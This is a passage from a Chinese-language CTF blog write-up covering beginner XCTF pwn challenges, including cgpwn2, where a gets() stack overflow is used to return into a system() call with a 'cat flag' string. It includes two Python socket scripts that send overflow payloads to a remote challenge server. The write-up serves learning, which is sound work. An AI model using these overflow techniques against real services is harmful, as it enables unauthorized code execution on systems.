+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># coding = utf-8</span><br><br><span class="hljs-keyword">import</span> socket<br><br>s = socket.socket()<br>s.connect((<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">60575</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_recv</span>(<span class="hljs-params">s</span>):</span><br>    buffer = s.recv(<span class="hljs-number">4096</span>)<br>    <span class="hljs-built_in">print</span>(buffer.decode())<br><br>get_recv(s)<br>get_recv(s)<br><br>s.send(<span class="hljs-string">&#x27;1&#x27;</span>.encode() + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>get_recv(s)<br><br>s.send(<span class="hljs-string">b&quot;m1n9yu3\n&quot;</span>)<br>get_recv(s)<br>get_recv(s)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>) + <span class="hljs-number">0x804868B</span>.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>) + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">231</span> + <span class="hljs-string">b&#x27;\n&#x27;</span><br><span class="hljs-comment"># print(payload.decode())</span><br>s.send(payload)<br>get_recv(s)<br><br><span class="hljs-comment"># s.send(b&#x27;ls\n&#x27;)</span><br>get_recv(s)<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032042447.png" srcset="/img/loading.gif" lazyload alt="image-20211103204209387"></p>
+<h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>最后一个简单题</p>
+<p>提供了 pwn 函数 ， pwn函数里调用了 system </p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032105805.png" srcset="/img/loading.gif" lazyload alt="image-20211103210548760"></p>
+<p>但是 程序中，并没有找到 /bin/sh 字符串， 本题只能自己构造 /bin/sh 或者  cat flag 字符串 让 system 调用</p>
+<p>main函数调用了 hello  , hello 从控制台读取了 name , 和  一个 message </p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032107008.png" srcset="/img/loading.gif" lazyload alt="image-20211103210740964"></p>
+<p>调用了 gets  危险函数， 造成了 栈溢出， 查看栈帧</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032109070.png" srcset="/img/loading.gif" lazyload alt="image-20211103210936997"></p>
+<p>溢出长度为 0x26  + 4  = 42 之后就是 返回地址  （pwn函数） 然后 再跟上 name 的地址， name 输入一个系统命令， 读取flag</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># coding = utf-8</span><br><br><span class="hljs-keyword">import</span> socket<br><br>s = socket.socket()<br>s.connect((<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-number">58449</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_recv</span>():</span><br>    buffer = s.recv(<span class="hljs-number">4096</span>)<br>    <span class="hljs-built_in">print</span>(buffer)<br><br>get_recv()<br>get_recv()<br><br>s.send(<span class="hljs-string">b&#x27;cat flag\n&#x27;</span>)<br><br>get_recv()<br>get_recv()<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">42</span> + <span class="hljs-number">0x0804855A</span>.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>) + <span class="hljs-number">0x804A080</span>.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br><br>s.send(payload)<br><br>get_recv()<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032111627.png" srcset="/img/loading.gif" lazyload alt="image-20211103211105570"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+        <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" class="print-no-link">#栈溢出</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>xctf_pwn_入门</div>
+      <div>https://pwner.top/2021/11/07/xctf-pwn-入门/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>m1n9yu3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年11月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/07/vmware%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%B9%E5%BC%8F%E5%90%AF%E5%8A%A8%E6%9C%BA%E5%99%A8/" title="vmware命令行方式启动机器">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vmware命令行方式启动机器</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/30/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%902/" title="样本分析2">
+                        <span class="hidden-mobile">样本分析2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
